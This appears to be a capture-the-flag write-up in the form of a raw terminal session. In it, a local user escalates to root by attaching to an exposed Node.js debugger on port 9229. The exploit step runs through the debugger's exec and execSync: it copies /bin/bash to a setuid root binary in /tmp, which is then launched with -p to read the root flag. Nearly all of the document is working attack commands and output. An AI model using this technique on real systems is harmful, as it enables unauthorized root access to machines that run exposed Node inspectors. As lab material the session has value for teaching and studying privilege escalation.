# Privilege Esc via Insecure debug interface [ Exposed Debugger ]

```bash
engineer@reactor:/opt/uptime-monitor$ ss -tunlp
Netid           State            Recv-Q           Send-Q                      Local Address:Port                       Peer Address:Port           Process           
udp             UNCONN           0                0                              127.0.0.54:53                              0.0.0.0:*                                
udp             UNCONN           0                0                           127.0.0.53%lo:53                              0.0.0.0:*                                
udp             UNCONN           0                0                                 0.0.0.0:68                              0.0.0.0:*                                
tcp             LISTEN           0                4096                              0.0.0.0:22                              0.0.0.0:*                                
tcp             LISTEN           0                4096                           127.0.0.54:53                              0.0.0.0:*                                
tcp             LISTEN           0                4096                        127.0.0.53%lo:53                              0.0.0.0:*                                
tcp             LISTEN           0                511                             127.0.0.1:9229                            0.0.0.0:*                                
tcp             LISTEN           0                4096                                 [::]:22                                 [::]:*                                
tcp             LISTEN           79               511                                     *:3000                                  *:*            

                    
engineer@reactor:/opt/uptime-monitor$ which node
/usr/bin/node

engineer@reactor:/opt/uptime-monitor$ /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
Starting inspector on 127.0.0.1:9229 failed: address already in use
uptime-monitor up, pid=46289
node:fs:2380
    return binding.writeFileUtf8(
                   ^

Error: EACCES: permission denied, open '/var/log/uptime-monitor.csv'
    at Object.writeFileSync (node:fs:2380:20)
    at Object.appendFileSync (node:fs:2461:6)
    at record (/opt/uptime-monitor/worker.js:25:8)
    at ClientRequest.<anonymous> (/opt/uptime-monitor/worker.js:64:9)
    at ClientRequest.emit (node:events:524:28)
    at Socket.emitRequestTimeout (node:_http_client:849:9)
    at Object.onceWrapper (node:events:638:28)
    at Socket.emit (node:events:536:35)
    at Socket._onTimeout (node:net:595:8)
    at listOnTimeout (node:internal/timers:581:17) {
  errno: -13,
  code: 'EACCES',
  syscall: 'open',
  path: '/var/log/uptime-monitor.csv'
}

Node.js v20.20.2

engineer@reactor:/opt/uptime-monitor$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
Uint8Array(0)
(To exit, press Ctrl+C again or Ctrl+D or type .exit)

debug> 

engineer@reactor:/opt/uptime-monitor$ ls
worker.js

engineer@reactor:/opt/uptime-monitor$ cd /tmp

engineer@reactor:/tmp$ ls -la
total 2516
drwxrwxrwt 15 root     root        4096 Jun 13 13:08 .
drwxr-xr-x 23 root     root        4096 May 20 10:07 ..
prw-r--r--  1 node     node           0 Jun 13 12:41 f
drwxrwxrwt  2 root     root        4096 Jun 13 12:14 .font-unix
drwxrwxrwt  2 root     root        4096 Jun 13 12:14 .ICE-unix
-rwxrwxr-x  1 engineer engineer 1063041 Jun 13 12:36 linpeas.sh
-rwsr-sr-x  1 root     root     1446024 Jun 13 13:04 r00t
drwx------  2 root     root        4096 Jun 13 12:14 snap-private-tmp
drwx------  3 root     root        4096 Jun 13 12:14 systemd-private-ac453a6643d24ee3a2c9f3fd51063d36-ModemManager.service-dEUS9g
drwx------  3 root     root        4096 Jun 13 12:14 systemd-private-ac453a6643d24ee3a2c9f3fd51063d36-polkit.service-5e90kw
drwx------  3 root     root        4096 Jun 13 12:14 systemd-private-ac453a6643d24ee3a2c9f3fd51063d36-systemd-logind.service-2ruBmC
drwx------  3 root     root        4096 Jun 13 12:14 systemd-private-ac453a6643d24ee3a2c9f3fd51063d36-systemd-resolved.service-j635Nk
drwx------  3 root     root        4096 Jun 13 12:14 systemd-private-ac453a6643d24ee3a2c9f3fd51063d36-systemd-timesyncd.service-wJsVMs
drwx------  3 root     root        4096 Jun 13 12:27 systemd-private-ac453a6643d24ee3a2c9f3fd51063d36-upower.service-bWjFNa
drwx------  2 engineer engineer    4096 Jun 13 12:55 tmux-1000
drwx------  2 root     root        4096 Jun 13 12:15 vmware-root_723-4282236435
drwxrwxrwt  2 root     root        4096 Jun 13 12:14 .X11-unix
drwxrwxrwt  2 root     root        4096 Jun 13 12:14 .XIM-unix

engineer@reactor:/tmp$ /tmp/root -p
-bash: /tmp/root: No such file or directory

engineer@reactor:/tmp$ /tmp/r00t -p

r00t-5.2# cat /root/root.txt
8e3a2d1fcb544faafdd07583d7032cf5
r00t-5.2# 
```